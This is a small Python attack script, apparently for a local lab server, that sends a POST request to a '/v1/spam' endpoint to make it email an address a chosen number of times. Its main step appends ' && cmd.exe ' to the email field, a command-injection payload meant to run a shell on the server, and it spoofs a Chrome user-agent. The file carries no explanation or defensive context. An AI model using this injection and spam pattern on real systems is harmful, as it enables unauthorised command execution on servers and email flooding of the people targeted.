import requests
import argparse

def sendSpam(email,times):
    url = "http://127.0.0.1:999/v1/spam"

    # Build the headers and request body
    data = {
            "email": f"{email}",
            "times": f"{times}"
           }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
        'Content-Type': 'application/json',
        'Accept': '*/*',
        'Origin': 'http://127.0.0.1:999',
        'Referer': 'http://127.0.0.1:999/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    # Create a session
    session = requests.Session()

    # Make the POST request
    response = session.post(url, json=data, headers=headers)

    # Check the response
    if response.status_code == 200:
        # make it green 
        print("\033[92m" + "Request successful." + "\033[0m")
    else:
        print("\033[91m" + "Request failed." + "\033[0m")
        print(response.text)
        
parser = argparse.ArgumentParser(description="TestHack to post request to webserver.")
subparsers = parser.add_subparsers(dest="command")

spam_parser = subparsers.add_parser('spam', help='Spam the email.')
spam_parser.add_argument('email', type=str, help='The email to spam.')
spam_parser.add_argument('times', type=int, help='The number of times to spam the email.', default=1)

# python rawPostToWebserver.py spam email times

args = parser.parse_args()

if args.command == "spam":
    sendSpam(args.email + " && cmd.exe ", args.times)
else :
    print("No command given.")
